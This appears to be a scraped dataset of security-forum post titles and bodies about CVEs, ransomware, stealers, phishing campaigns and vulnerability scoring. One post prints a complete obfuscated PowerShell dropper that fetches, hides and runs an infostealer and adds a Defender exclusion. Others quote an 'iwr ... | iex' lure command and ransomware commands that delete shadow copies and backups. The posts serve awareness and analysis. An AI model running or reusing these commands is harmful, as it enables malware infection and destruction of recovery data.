@@ -1,0 +1,624 @@
+text
+XSS To RCE By Abusing Custom File Handlers - Kentico Xperience CMS (CVE-2025-2748) - watchTowr Labs. 
+CrushFTP Authentication Bypass - CVE-2025-2825 — ProjectDiscovery Blog. 
+Blacklock Ransomware: A Late Holiday Gift with Intrusion into the Threat Actor's Infrastructure. 
+"Llama's Paradox - Delving deep into Llama.cpp and exploiting Llama.cpp's Heap Maze, from Heap-Overflow to Remote-Code Execution. "
+Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927). 
+"By Executive Order, We Are Banning Blacklists - Domain-Level RCE in Veeam Backup & Replication (CVE-2025-23120) - watchTowr Labs. "
+Jaguar Land Rover Breached by HELLCAT Ransomware Group Using Its Infostealer Playbook—Then a Second Hacker Strikes. 
+New Lumma Stealer campaign abuses Reddit threads to drop malware via fake WeTransfer links. 
+Pre-authentication SQL injection to RCE in GLPI (CVE-2025-24799/CVE-2025-24801). 
+Analysis of CVE-2025-24813 Apache Tomcat Path Equivalence RCE. 
+Detecting and Mitigating the Apache Camel Vulnerability CVE-2025-27636. 
+Sitecore: Unsafe Deserialisation Again! (CVE-2025-27218). 
+"Case Study: Traditional CVSS scoring missed this actively exploited vulnerability (CVE-2024-50302). I came across an interesting case that I wanted to share with r/netsec - it shows how traditional vulnerability scoring systems can fall short when prioritizing vulnerabilities that are actively being exploited.
+
+The vulnerability: CVE-2024-50302
+
+This vulnerability was just added to CISA's KEV (Known Exploited Vulnerabilities) catalog today, but if you were looking at standard metrics, you probably wouldn't have prioritized it:
+
+Base CVSS: 5.5 (MEDIUM)
+CVSS-BT (with temporal): 5.5 (MEDIUM)
+EPSS Score: 0.04% (extremely low probability of exploitation)
+
+But here's the kicker - despite these metrics, this vulnerability is actively being exploited in the wild.
+
+Why standard vulnerability metrics let us down:
+
+I've been frustrated with vulnerability management for a while, and this example hits on three problems I consistently see:
+
+1. Static scoring: Base CVSS scores are frozen in time, regardless of what's happening in the real world
+2. Temporal limitations: Even CVSS-BT (Base+Temporal) often doesn't capture actual exploitation activity well
+3. Probability vs. actuality: EPSS is great for statistical likelihood, but can miss targeted exploits
+
+A weekend project: Threat-enhanced scoring
+
+As a side project, I've been tinkering with an enhanced scoring algorithm that incorporates threat intel sources to provide a more practical risk score. I'm calling it CVSS-TE.
+
+For this specific vulnerability, here's what it showed:
+
+Before CISA KEV addition:
+- Base CVSS: 5.5 (MEDIUM)
+- CVSS-BT: 5.5 (MEDIUM)
+- CVSS-TE: 7.0 (HIGH) - Already elevated due to VulnCheck KEV data
+- Indicators: VulnCheck KEV
+
+After CISA KEV addition:
+- Base CVSS: 5.5 (MEDIUM)
+- CVSS-BT: 5.5 (MEDIUM)
+- CVSS-TE: 7.5 (HIGH) - Further increased
+- Indicators: CISA KEV + VulnCheck KEV
+
+Technical implementation
+
+Since this is r/netsec, I figure some of you might be interested in how I approached this:
+
+The algorithm:
+1. Uses standard CVSS-BT score as a baseline
+2. Applies a quality multiplier based on exploit reliability and effectiveness data
+3. Adds threat intelligence factors from various sources (CISA KEV, VulnCheck, EPSS, exploit count)
+4. Uses a weighted formula to prevent dilution of high-quality exploits
+
+The basic formula is: CVSS-TE = min(10, CVSS-BT_Score * Quality_Multiplier + Threat_Intel_Factor - Time_Decay)
+
+Threat intel factors are weighted roughly like this:
+- CISA KEV presence: +1.0
+- VulnCheck KEV presence: +0.8
+- High EPSS (≥0.5): +0.5
+- Multiple exploit sources present: +0.25 to +0.75 based on count
+
+The interesting part
+
+What makes this vulnerability particularly interesting is the contrast between its EPSS score (0.04%, which is tiny) and the fact that it's being actively exploited. This is exactly the kind of case that probability-based models can miss.
+
+For me, it's a validation that augmenting traditional scores with actual threat intel can catch things that might otherwise slip through the cracks.
+
+I made a thing
+
+I built a small lookup tool at github.io/cvss-te where you can search for CVEs and see how they score with this approach.
+
+The code and methodology is on GitHub if anyone wants to take a look. It's just a weekend project, so there's plenty of room for improvement - would appreciate any feedback or suggestions from the community.
+
+Anyone else run into similar issues with standard vulnerability metrics? Or have alternative approaches you've found useful?​​​​​​​​​​​​​​​​"
+Techlore video review of BusKill (Open-Source Dead Man Switch) 🔒. 
+Wallbleed: A Memory Disclosure Vulnerability in the Great Firewall of China. 
+🚨 New vulnerability in Apache Tomcat (CVE-2025-24813) 🚨. 
+"Moviepass was part of the attack on twitter / X recently. got insight! Idk which sub to post this but here: 
+
+Moviepass is part of the cyber attack. 
+
+So, I had Moviepass when it was live, years ago. Throughout last yesr and this yesr I’d get emails from them. Something bc about an updated version. I didn’t think much of it. Asked me to sign up for a new version of it as like only the first X number of ppl can. I clicked the link I. The email.
+
+Problem is, my guards went up when they asked me to click on the email again. Keep in mind this whole time thr emails are coming from legit address. 
+
+You k ow how if if hold the button down it gives a preview of the web address? When I did rhis, thr website was all sorts of random characters like fkgh2454dghh. And it was super long. It wasn’t for the previous time I clicked. 
+
+Then the teitter attack happened. 
+
+Then my email app (or my email provider?) logged me out the email. It kept telling me to sign back in. 
+
+So, yeah. Thru Moviepass they tried. If you go to Moviepass subreddit, there’s stuff about MP trying to relaunch a new version recently etc. 
+
+I think going forward thr best attacks will come from inside established companies or ones that have went under or trying to survive. 
+
+Thet tried hard. Like iver the course of last year they are hyping up a new version of Moviepass and like “limited sign up so hurry before the period ends!”
+
+I didn’t continue once I saw all those random characters, but Msybe it was too late. 
+
+Just giving my experience. I’ll post this in a couple more subs as I have t seen anyone talk about this."
+CoffeeLoader Malware Is Stacked With Vicious Evasion Tricks. 
+"Hackademia - 250+ free mini web app labs. [Hackademia](https://github.com/Trivulzianus/Hackademia) was born out of the frustration with the price of HTB and THM. Granted, these labs are not as high quality, but they might get the point across for different vulns and how to exploit them.
+
+Notably, each lab also recommends best practices for developers to mitigate the vuln appearing in the lab.
+
+Hackademia will initiate a Flask server that can be accessed through Localhost, and will show a basic GUI with routing to different labs.
+
+  
+Happy hacking!"
+"Evil Twin. Can you use same adapter as AP and attacking adapter? 
+Yesterday I wanted to try my evil twin skills so I started attacking my own wifi with fluxion since I’m using VM I can’t access my local network card and I used my Alfa Adapter as both my attacking and AP and couldn’t access the login page created 
+So was wondering it’s because I was using same card for both "
+Exploiting LibreOffice (CVE-2024-12425 and CVE-2024-12426). 
+"Opensource firm/hard-ware online party ""vPub"" - TODAY. Security through obscurity is futile - so, to learn more about the opensource firmwares & protect yourself, I invite you to a joint ''DUG#9 & vPub 0xE'' today's event ;-) Full schedule, as well as the join links, are available on [**this page**](https://vpub.dasharo.com/e/17/dasharo-user-group-9) \- but here is a brief description of how it will look like:
+
+1. on DUG *(5 PM UTC)* : we will discuss the Dasharo distribution of coreboot opensource PC firmware *(much better than a typical closed-source UEFI: it provides the hardened security, high quality, cool features and almost-lifetime upgrades!)*
+
+* If you are looking for a truly secure modern laptop with an opensource firmware that - while satisfying your privacy needs! - also provides the [valuable benefits](https://novacustom.com/coreboot-laptop/) to your user experience: please make sure to see [""NovaCustom: new products and plans for the near future""](https://cfp.3mdeb.com/developers-vpub-0xe-2025/talk/HDR9SN/) talk by our prominent guest Wessel Klein Snakenborg - the founder of NovaCustom company that makes such laptops and is committed to improving their opensource [Dasharo](https://www.dasharo.com/) firmware with the help of [3mdeb](https://3mdeb.com/)
+
+1. on vPub *(7 PM UTC)* : we will be having an **Opensource Online Party** : with a cozy free-for-all chat about everything opensource firmware/hardware-related, as well as a few planned talks from our special guests who would like to share their hard won in-depth knowledge to save a lot of your time:
+
+* Kamil Aronowski - an active member of Qubes OS community, a volunteer reviewer of UEFI shim signing submissions and a respected IT security engineer, will tell you [how to implement a secure signing infrastructure to become your own UEFI Secure Boot CA](https://cfp.3mdeb.com/developers-vpub-0xe-2025/talk/QZKE88/)
+* Filip Lewinski - a firmware developer from our 3mdeb company who has mastered & would like to tell you about the deguard utility in his [""Introduction to Deguard""](https://cfp.3mdeb.com/developers-vpub-0xe-2025/talk/WVJFQD/) talk: this wonderful tool allows to bypass the BootGuard - a major roadblock for opensource coreboot firmware on a wide range of Intel-based motherboards
+* Matt DeVillier aka u/MrChromebox \- a famous member of coreboot community who is making the custom opensource firmwares for Chromebooks & Chromeboxes and gave new life to these devices for a lot of people - will be helping you during his [**AMA about open source firmware**](https://cfp.3mdeb.com/developers-vpub-0xe-2025/talk/WVJFQD/)
+
+Aside from a cozy opensource chat, our free-for-all sections are also an excellent opportunity for you to learn about rare devices that support the opensource firmware and are hard to stumble upon elsewhere - as well as how to configure & build & flash it. All your questions will be answered! ;-)
+
+**Join links & full events schedule are available here** ***(both video streams and anonymous text chats will be available)*** **:**
+
+[**DUG#9 & vPub 0xE opensource online Party! - TODAY**](https://vpub.dasharo.com/e/17/dasharo-user-group-9)
+
+P.S. to avoid missing out future events, join our [Matrix](https://matrix.to/#/#dasharo-osf-vpub:matrix.org) or a [tiny-volume event notification newsletter](https://newsletter.3mdeb.com/subscription/0_K65I7ro) *(just \~4 e-mails per year)*"
+"California Cryobank Hacked – Sensitive Customer Data Exposed. **California Cryobank LLC has confirmed a data breach that compromised sensitive personal information of its customers.**
+
+**Key Points:**
+
+* Data breach occurred on April 20, 2024, undetected until October 4, 2024.
+* Over 28 Maine residents confirmed affected, estimates suggest thousands may be involved.
+* The breach involved a zero-day vulnerability allowing persistent unauthorized access.
+* Exposed data includes names and sensitive reproductive and genetic information.
+* Complimentary credit monitoring and identity theft protection offered to affected individuals.
+
+The data breach at California Cryobank has raised serious concerns due to its timing and the sensitivity of the data involved. Occurring on April 20, 2024, the breach remained unchecked for nearly six months, revealing a significant lapse in data security responsible for safeguarding personal identifiable information. The company discovered that cybercriminals exploited a zero-day vulnerability in their client management system, allowing them to maintain access to sensitive databases for an estimated 12 hours before being detected. Costly ramifications follow, with estimates suggesting that the actual number of impacted clients could potentially reach into the thousands given the breadth of California Cryobank's clientele across North America.
+
+The implications of this breach are particularly troubling, as the information compromised includes not just names but also reproductive and genetic data that can have far-reaching effects on individuals' privacy. With breaches of this nature becoming more common in healthcare and reproductive technology sectors, experts warn that such organizations are increasingly attracting sophisticated threat actors. In response, California Cryobank has taken steps to enhance their security protocols, including new encryption measures and the introduction of multi-factor authentication, while offering affected clients access to credit monitoring and identity theft protection services. They are also actively cooperating with law enforcement and have set up a dedicated call center to provide support to concerned customers as they navigate this distressing situation.
+
+What steps do you think companies in the healthcare sector should take to improve their data security?
+
+**Learn More:** [Cyber Security News](https://cybersecuritynews.com/us-sperm-donor-giant-california-cryobank-hackers/)
+
+"
+"WiFi Pineapple Hacking Tool: Guide to Setup and First Attack. I put together a detailed guide on the WiFi Pineapple, covering:
+
+* **How to set it up** and configure it properly
+* **Step-by-step walkthrough** for launching an Evil Portal attack
+* **How it works** to capture credentials and test network security
+
+This guide is for educational and ethical penetration testing purposes only. Unauthorized use against networks you don’t own or have permission to test is illegal.
+
+**Check it out here:**  
+[WiFi Pineapple Hacking Tool: Guide to Setup and First Attack](https://darkmarc.substack.com/p/wifi-pineapple-hacking-tool-guide)
+
+Let me know if you have any questions!"
+Gootloader Returns: Malware Hidden in Google Ads for Legal Documents. 
+"Blacklock Ransomware: Intrusion into the Threat Actor's Infrastructure - ""Resecurity identified a vulnerability present at the Data Leak Site (DLS) of BlackLock in the TOR network - successful exploitation of which allowed our analysts to collect substantial intelligence about their activity"". 
+Resecurity identified a vulnerability present at the Data Leak Site (DLS) of BlackLock in the TOR network - successful exploitation of which allowed our analysts to collect substantial intelligence about their activity outside of the public domain.
+
+"
+Gamaredon campaign abuses LNK files to distribute Remcos backdoor. 
+CVE-2025-1974: PoC for the IngressNightmare (CVE-2025-1974 ) vulnerability found in the Kubernetes ingress-nginx Admission Controller. 
+"RedCurl's Ransomware Debut: New Family, QWCrypt, Targets Hypervisors. Bitdefender Labs has investigated a new ransomware family, **QWCrypt**, deployed by the **RedCurl** group (Earth Kapre/Red Wolf) for the first time. We're sharing this for awareness and IOCs. Notably, they're targeting hypervisors, not endpoints. We're also challenging the ""corporate espionage"" label often applied to this group, as their tactics suggest other potential motivations.
+
+We're sharing this to raise awareness, and happy to answer questions about our findings."
+CVE-2025-26633: How Water Gamayun Weaponizes MUIPath using MSC EvilTwin. 
+Exploit Attempts for Cisco Smart Licensing Utility CVE-2024-20439 and CVE-2024-20440. 
+"Grandoreiro attacks LATAM. A phishing campaign is actively targeting Latin American countries, leveraging geofencing to filter victims. Behind it is Grandoreiro—the most persistent banking trojan in LATAM.
+
+Full execution chain: [https://app.any.run/tasks/02ea5d54-4060-4d51-9466-17983fc9f79e/](https://app.any.run/tasks/02ea5d54-4060-4d51-9466-17983fc9f79e/)  
+Malware analysis: [https://app.any.run/tasks/97141015-f97f-4ff0-b779-31307beafd47/](https://app.any.run/tasks/97141015-f97f-4ff0-b779-31307beafd47/)
+
+The execution chain begins with a phishing page luring users into downloading a fake PDF—actually an archive delivering Grandoreiro.
+
+The malware sends the victim’s IP to ip-api to determine geolocation. Based on the result, it selects the appropriate C2 server.
+
+Next, it queries [dns.google](https://dns.google/) and provides the C&C domain name, which Google resolves to an IP address. This approach helps the malware avoid DNS-based blocking.
+
+Finally, the malware sends a GET request to obtain the resolved IP.
+
+Activity spiked between February 19 and March 14, and the campaign is still ongoing.
+
+The campaign heavily relies on the subdomain contaboserver\[.\]net.  
+TI Lookup queries to find more IOCs:
+
+1. [https://intelligence.any.run/analysis/lookup](https://intelligence.any.run/analysis/lookup#%7B%22query%22:%22contaboserver%22,%22dateRange%22:180%7D)
+2. [https://intelligence.any.run/analysis/lookup](https://intelligence.any.run/analysis/lookup#{%22query%22:%22destinationIP:%5C%22158.247.7.206%5C%22%22,%22dateRange%22:180}%20)
+
+Source: r/ANYRUN "
+SparrowDoor 2.0: Chinese Hackers Deploy More Powerful Malware in Global Attacks. 
+"Vanhelsing Ransomware Analysis | From a TV Show into a Fully Fledged Ransomware. The “Vanhelsing” ransomware intriguingly borrows its name from a popular vampire-themed TV series, indicating how modern cyber threats sometimes employ culturally resonant names to draw attention or disguise their origin. Though unproven, the connection hints at a growing trend of thematically branded malware.
+
+Vanhelsing: Ransomware-as-a-Service
+
+Emerging in March 2025, Vanhelsing RaaS allows even novice users to execute sophisticated cyberattacks via a turnkey control panel. This democratizes cybercrime, lowering the barrier to entry and dramatically expanding the threat landscape.
+
+Full video [from here.](https://youtu.be/A8C2sTF71fQ)
+
+Full writeup [from here.](https://motasem-notes.net/vanhelsing-ransomware-analysis-from-a-tv-show-into-a-fully-fledged-ransomware/)
+
+"
+New Arcane Stealer Malware Targets VPN Accounts via YouTube Cheats. 
+"Lumma Stealer dropped via Reddit comment spam — redirection chain + payload analysis. Found a fresh campaign dropping Lumma Stealer via Reddit comments.
+
+The chain:
+
+1. Reddit comment with fake WeTransfer URL
+
+2. Redirect via Bitly to attacker-controlled .app page
+
+3. Payload: EXE file (Lumma Stealer 4.0)
+
+The post includes redirection analysis, IOC list, and detection ideas.
+
+If you’re tracking Lumma or monitoring threat actor activity via social platforms, this one’s worth a look.
+
+ Full report in first comment"
+Black Basta russian ransomware group chat leak. [https://github.com/0xCh1/BlackBasta](https://github.com/0xCh1/BlackBasta)
+"SpyLend Android malware downloaded 100,000 times from Google Play.  [https://www.bleepingcomputer.com/news/security/spylend-android-malware-downloaded-100-000-times-from-google-play/](https://www.bleepingcomputer.com/news/security/spylend-android-malware-downloaded-100-000-times-from-google-play/)
+
+# An Android malware app called SpyLend has been downloaded over 100,000 times from Google Play, where it masqueraded as a financial tool but became a predatory loan app for those in India."
+"Malware faking ""Cloudflare Am I Human"" to get user to install virus [video]. "
+"SpyLend Android malware poses new threats. ***SpyLend has reached over 100,000 downloads, disguising itself as a financial tool.***
+
+SpyLend infiltrates Android devices by masquerading as a legitimate financial application. This malware exploits user data, particularly in India, leading to harrowing experiences involving harassment for loan repayments. The app remains a threat even after its removal from Google Play, continuing to compromise data from infected devices.
+
+The widespread nature of SpyLend, along with its variants, proves particularly problematic for unwary users searching for quick financial solutions. These apps not only manipulate personal data but also leverage sensitive information for means of extortion.
+
+* Over 100,000 downloads reported for SpyLend
+* Targeting users under the guise of financial services-Reports of harassment and photo blackmail emerged
+* Excessive permissions requested by installed apps-SpyLend leads users to download additional malicious software
+
+[(View Details on PwnHub)](https://www.reddit.com/r/pwnhub/comments/1ivubhp/spylend_malware_hits_google_play_over_100000/)"
+"Microsoft Outlook Exploited by FinalDraft Malware for Hidden Communication. **Elastic Security Labs discovered that new malware called FinalDraft** is exploiting Microsoft Outlook drafts for hidden communication in a cyber-espionage campaign. By blending into Microsoft 365 traffic, attackers avoid detection while targeting a South American ministry.
+
+The attack begins with PathLoader, which installs the FinalDraft backdoor. Instead of sending actual emails, the backdoor uses Outlook drafts to communicate with the attacker’s infrastructure, hiding commands and responses in draft emails (r\_<session-id>, p\_<session-id>). After execution, drafts are deleted, making it difficult to trace. ([View Details on PwnHub](https://www.reddit.com/r/pwnhub/comments/1iqwed7/microsoft_outlook_exploited_by_finaldraft_malware/))"
+"TikToker @TheShellShield Is Spreading VIDAR Malware Through Fake Free Software Tutorials. I recently discovered that a TikToker, @TheShellShield, has been making multiple videos claiming to offer free software like Spotify Premium through a PowerShell command. However, this is actually a malware distribution campaign that installs the VIDAR infostealer onto victims’ machines.
+
+How the Scam Works:
+	1.	The TikTok videos instruct users to run a PowerShell command:
+
+iwr “(ProgramName).keytool.cc” | iex
+
+	•	The domain changes based on the software being “offered.”
+
+	2.	This downloads a .ps1 (PowerShell script) onto the user’s machine.
+	3.	The script decodes a Base64-encoded URL, revealing:
+
+azsolver.com/files/main.exe
+
+	•	This main.exe file is VIDAR malware.
+
+	4.	The script then:
+	•	Moves main.exe to Local AppData
+	•	Hides the file and adds it as an exclusion in Windows Defender
+	•	Runs the malware
+	•	Displays an error message:
+
+An error occurred during activation. Please try again.
+
+
+	5.	Victims are unaware that their system is now infected with an infostealer or RAT (Remote Access Trojan).
+
+Signs of Infection:
+	•	People in the comments are reporting activation errors, to which @TheShellShield responds with misleading troubleshooting questions (e.g., “What version of Windows are you on?”).
+
+Evidence & Actions Taken:
+	•	Azsolver.com itself is not inherently malicious, but azsolver.com/files/main.exe is being used to distribute malware.
+	•	VirusTotal has flagged this executable as malware (VIDAR Infostealer).
+	•	I’ve messaged the owner of azsolver.com to warn them about their site being used for malware distribution.
+	•	I reported @TheShellShield to TikTok, but my takedown request was denied.
+"
+"Fake Software activation Malware. I have very recently come across a TikTok (user: theshellshield ) account claiming to be able to activate certain software. I knew that this was nonsense. It was clear that it was relying on people  who did not know what they were doing typing stuff into the PowerShell and running it. The videos led the user to type `iwr ""windows.keytool.cc | iex` which downloaded and ran a script.
+
+To see what was happening here I loaded up a Linux VM and used `iwr ""windows.keytool.cc"" -OutFile ""/home/user/output.txt""` to have a look at the code.
+
+Here is what i got:
+
+    $downloadUrlB64 = ""aHR0cHM6Ly9henNvbHZlci5jb20vZmlsZXMvbWFpbi5leGU=""
+    $updaterExeB64 = ""dXBkYXRlci5leGU=""
+    $hiddenAttrB64 = ""SGlkZGVu""
+    $silentlyContinueB64 = ""U2lsZW50bHljb250aW51ZQ==""
+    $stopActionB64 = ""U3RvcA==""
+    $directoryB64 = ""RGlyZWN0b3J5""
+    $runAsB64 = ""UnVuQXM=""
+    
+    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
+    $updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
+    $hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
+    $silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
+    $stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
+    $directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
+    $runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
+    
+    $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
+    New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
+    
+    $tempPath = Join-Path $hiddenFolder $updaterExe
+    
+    function Add-Exclusion {
+        param ([string]$Path)
+        try {
+            Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
+        } catch {}
+    }
+    
+    try {
+        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
+        Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
+        Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
+        Add-Exclusion -Path $tempPath
+        Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait
+        Remove-Item $hiddenFolder -Recurse -Force
+    } catch {
+        exit 1
+    } finally {
+        Write-Host ""An error occurred during activation. Please try again.""
+    }
+
+After decoding the base64 I got these values for the varibles
+
+|Variable|Variable|Decoded Value|
+|:-|:-|:-|
+|$downloadUrlB64|aHR0cHM6Ly9henNvbHZlci5jb20vZmlsZXMvbWFpbi5leGU=|[https://azsolver.com/files/main.exe](https://removed)|
+|$updaterExeB64|dXBkYXRlci5leGU=|updater.exe|
+|$hiddenAttrB64|SGlkZGVu|Hidden|
+|$silentlyContinueB64|U2lsZW50bHljb250aW51ZQ==|SilentlyContinue|
+|$stopActionB64|U3RvcA==|Stop|
+|$directoryB64|RGlyZWN0b3J5|Directory|
+|$runAsB64|UnVuQXM=|RunAs|
+
+^(Note: I have removed the clickability of the link so you don't accidently download the file)
+
+I now know what this script does.
+
+1. Decodes the base64 to get the values above
+2. It generates a folder in the `LocalAppData` directory using a random GUID `$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString()) New-Item -ItemType $directory -Path $hiddenFolder | Out-Null`
+3. Downloads a suspicious File from [https://azsolver.com/files/main.exe](https://removed) and saves it as `updater.exe`  `Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction`
+4. Modifies the File and Folder attributes to mark them as hidden `Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr`
+5. Tries to get around Windows defender by attempting to exclude from the scanning (At least that's what I thinks its doing) `function Add-Exclusion { param ([string]$Path) try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {} } Add-Exclusion -Path $tempPath`
+6. Executes `updater.exe`  with Administrator  privileges while keeping window hidden `Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait`
+7. Deletes the evidence by removing the hidden folder `Remove-Item $hiddenFolder -Recurse -Force`
+8. If anything fails, display fake error message `Write-Host ""An error occurred during activation. Please try again.""`
+
+To conclude, I hope that this has brought some attention to it and that someone can help me get the account taken down. If anybody knows what happens with the exe after it runs please let me know as i am interested and not skilled enough to find out. Also feel free to suggest any ways i could of written this post better and or any errors i have made as this is the first time i have done this before.
+
+Thank you for reading.
+
+UPDATE: The account got banned on TikTok
+
+Also both keytool.cc and azsolver.com no longer host malware
+
+^(Edits: Corrected text spacing and updated the link)"
+"Deep Dive: Kernel-Level Monitoring for Real-Time Malware Behavior Analysis. One of the core components of modern antiviruses such as Kaspersky, BitDefender, OmniDefender, Avast and many more is the **kernel-level real-time protection**. 
+
+Unlike traditional monitoring methods that rely on high-level process observation, **kernel-level monitoring** allows us to capture low-level interactions between processes and the operating system. This provides detailed insights into how malware behaves in real-time—insights that are invaluable for threat intelligence and improving **detection capabilities**.
+
+Take a look at this log file for example:
+
+    Root Process: C:\Users\Unknown_analysis\documents\Unknown\desktop\0e66029132a885143b87b1e49e32663a52737bbff4ab96186e9e5e829aa2915f.exe (PID: 7492)
+    
+    Process created: PID: 1172, 
+    ImageName: \??\C:\Windows\System32\cmd.exe, 
+    CommandLine: ""C:\Windows\System32\cmd.exe"" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet
+    
+    Process created: PID: 6300, ImageName: \SystemRoot\System32\Conhost.exe, CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, Parent PID: 7492, Parent ImageName: \Device\HarddiskVolume3\Users\Malware_Analysis\Desktop\0e66029132a885143b87b1e49e32663a52737bbff4ab96186e9e5e829aa2915f.exe
+    
+    File Operations (252314):
+        - Cleanup file: c:\eclipse\features\org.eclipse.mylyn.jenkins.feature_4.3.0.v20240509-0539\feature.properties.lockbit
+        - Cleanup file: c:\eclipse\features\org.eclipse.mylyn.jenkins.feature_4.3.0.v20240509-0539\feature.xml.lockbit
+        - Cleanup file: c:\eclipse\features\org.eclipse.mylyn.jenkins.feature_4.3.0.v20240509-0539\license.html.lockbit
+    
+    - Querying value for key: \REGISTRY\USER\S-1-5-21-2754536055-3886740062-4036161825-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\DefaultIcon, ValueName: Full
+        - Querying value for key: \REGISTRY\USER\S-1-5-21-2754536055-3886740062-4036161825-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\ShellFolder, ValueName: Attributes
+        - Querying value for key: \REGISTRY\USER\S-1-5-21-2754536055-3886740062-4036161825-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.inf\UserChoice, ValueName: Hash
+        - Querying value for key: \REGISTRY\USER\S-1-5-21-2754536055-3886740062-4036161825-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.inf\UserChoice, ValueName: ProgId
+
+ The process **0e66029132a885143b87b1e49e32663a52737bbff4ab96186e9e5e829aa2915f.exe** seems to have spawned **cmd.exe** to run some nefarious commands such as:
+
+  
+`vssadmin delete shadows /all /quiet`: Deletes all Volume Shadow Copies without displaying any prompts
+
+`wmic shadowcopy delete`: Deletes shadow copies using Windows Management Instrumentation.
+
+`bcdedit /set {default} bootstatuspolicy ignoreallfailures`: Modifies the boot configuration to ignore failures. This can disable certain recovery options.
+
+`bcdedit /set {default} recoveryenabled no`: Disables Windows recovery mode.
+
+`wbadmin delete catalog -quiet`: Deletes the backup catalog, which prevents restoring from backups.
+
+The process queried numerous registry keys related to:
+
+* **Windows Explorer settings**
+* **File associations (**`.inf`**,** `.log`**,** `.sys`**)**
+* **Internet settings**
+* **Shell folders**
+
+They indicate that the process was gathering system information, these registry queries alone are not inherently malicious.
+
+However it's clear as day that this process is dangerous, and taking a closer inspection shows multiple files with the **.lockbit** extension were listed under the Eclipse plugins directory, this small segment provides enough information about the process and its behavior. 
+
+The log file exceeds several MBs in size due to the sheer amount activity and damage this ransomware caused.
+
+**Volume Shadow Copies** is an underutilized tool that is capable of restoring encrypted files which is the reason why most ransomware disable it in order to prevent recovery.
+
+Many antiviruses like Kaspersky, OmniDefender, BitDefender are capable of blocking these malicious behaviors and restore encrypted files to their original state."
+"Feeling kind of stuck. Need some guidance !. So I'm currently in my 3rd year of my 4 year course in college, and I’d say I'm somewhere in the middle when it comes to reverse engineering and malware analysis ( mostly comfortable with all the stuff, have worked with real samples like emotet, Snake, and wannacry too (not finished)). I've explored somewhat most of the tech (Ai, ml, webdev) and I’ve done quite a bit of exploit dev on both Linux and Windows too, and I regularly work and make open source tools and do low-level programming. It’s been fun and definitely helped me connect dots, and build a bigger picture of security. But man, every time I look for jobs in exploit dev, reversing or malware research as an fresher or even beginner, all I see are few results that also require 5+ years of experience, and I haven't even done an internship yet.
+
+So, I'm stuck. Where do I even start? I feel like all this knowledge might not be useful if I can’t find a way to turn it into a career. It’s frustrating when I see friends in web dev landing jobs easily after grinding leetcode ( I’ve also done some web development, so I’m comfortable with those stacks too but you know....), while I’m over here working on this stuff and unsure where to go next.
+
+Sorry for the long post, but I’d really appreciate any advice or guidance. I'm in real need of that. I wonder if I'm making a fool out of me asking this in public but yeah... Thanks in advance!
+
+I'm leaving my GitHub too:- 
+https://github.com/yourpwnguy I might not be that much active nowadays because of constantly doing new stuff. Cuda, drivers etc etc. "
+Is The Sofistication In The Room With Us? - X-Forwarded-For and Ivanti Connect Secure (CVE-2025-22457) - watchTowr Labs. 
+Suspected China-Nexus Threat Actor Actively Exploiting Critical Ivanti Connect Secure Vulnerability (CVE-2025-22457). 
+Microsoft fixes actively exploited Windows CLFS zero-day (CVE-2025-29824). 
+"Go beyond CVSS scores. When a new critical vulnerability appears, don't just react to the score. Take CVE-2025-24813 (Tomcat) as an example:
+
+ Look at the Scores: Start with CVSS and EPSS CVE-2025-24813 had a 9.8 CVSS and 99th percentile EPSS – high severity, actively exploited.
+
+ Read the Description: Understand how it works. What conditions are needed? 
+
+For CVE-2025-24813, the key was a specific non-default Tomcat configuration requirement. 
+We found a blog post detailing the exact Tomcat setting to search for. We searched our version control to see if that specific configuration was enabled anywhere. It wasn’t. So while it was a critical it appeared that it presented zero risk to us. 
+
+If you have a threat intel group or service (like Mandiant), check their assessment. Mandiant rated CVE-2025-24813 as aMedium, due to the uncommon non-default configuration.
+This multi-step approach gives a far more accurate picture of your actual risk than relying on scores alone.
+
+"
+Medusa Rides Momentum From Ransomware-as-a-Service Pivot. 
+"Insight into the DeepSeek Hack. So there’s this DeepSeek thing, basically China’s ChatGPT. It’s cheaper, supposedly better, and yep, already hacked. Wanna see how?"
+"Have any of you tried ProxyReaper?. Hi Black Hats and Black Cats
+
